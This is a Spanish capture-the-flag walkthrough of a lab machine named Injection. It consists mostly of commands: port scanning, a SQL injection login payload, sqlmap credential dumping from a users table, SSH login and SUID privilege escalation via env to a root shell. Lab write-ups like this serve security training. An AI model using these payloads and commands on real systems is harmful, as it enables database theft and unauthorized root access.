Maquina: Injection

Autor: El Pinguino de Mario 

Dificultad: Muy Facil

![Screenshot 2024-11-09 082542](https://github.com/user-attachments/assets/beff2ae3-6fc1-423c-9942-ee17e022a9fe)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-09 082716](https://github.com/user-attachments/assets/49213ad6-4d2d-4b3d-bc3c-2cbbc52a0c22)

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

![Screenshot 2024-11-09 082735](https://github.com/user-attachments/assets/d95bd4a3-c56a-40b1-9b07-f9d5d7f2504f)

Accedemos a la web y encontramos un panel de login e intentamos explotarlo con una SQL Injection
hppt://172.17.0.2
User: admin' or 1=1-- -
Password: cualquier cosa
No conseguimos bypasearlo

![Screenshot 2024-11-09 083004](https://github.com/user-attachments/assets/150da53c-3e35-4470-bb0e-2338038a81ac)

Vamos a probar una inyección SQL

sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch

![Screenshot 2024-11-09 083557](https://github.com/user-attachments/assets/d435b4c8-6eff-4c0b-9692-74ce3c7824d8)

sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch

![Screenshot 2024-11-09 083619](https://github.com/user-attachments/assets/66b1f52d-5f4a-4ffd-9c10-c53960be4cc5)

sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch

![Screenshot 2024-11-09 083644](https://github.com/user-attachments/assets/d3397b42-e733-4c92-884a-0672f800f1b5)

Por último, listamos las dos columnas que hay: passwd y usernames, y tenemos credenciales

![Screenshot 2024-11-09 083708](https://github.com/user-attachments/assets/64ee63fd-ec08-4d03-b11c-330228afc80c)

sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,usernames --dump --batch

Ahora, si accedemos a la web, nos dice lo siguiente:

![Screenshot 2024-11-09 083851](https://github.com/user-attachments/assets/f09fa5eb-175c-46ca-8bd1-fd715a1888dd)

ssh dylan@172.17.0.2

![Screenshot 2024-11-09 083940](https://github.com/user-attachments/assets/f7e7b3ae-bcad-4d29-a974-0061dd61f303)

find / -perm -4000 2>/dev/null

Encontramos el binario env

![Screenshot 2024-11-09 084245](https://github.com/user-attachments/assets/dcefe9d7-fc4a-4de7-bf93-2de3a2d23519)

Vamos a explotarlo haciendo una búsqueda en GTFOBins

/usr/bin/env /bin/sh -p

whoami

![Screenshot 2024-11-09 084333](https://github.com/user-attachments/assets/1c8f5581-a48d-44c3-ab65-339d7d6972de)
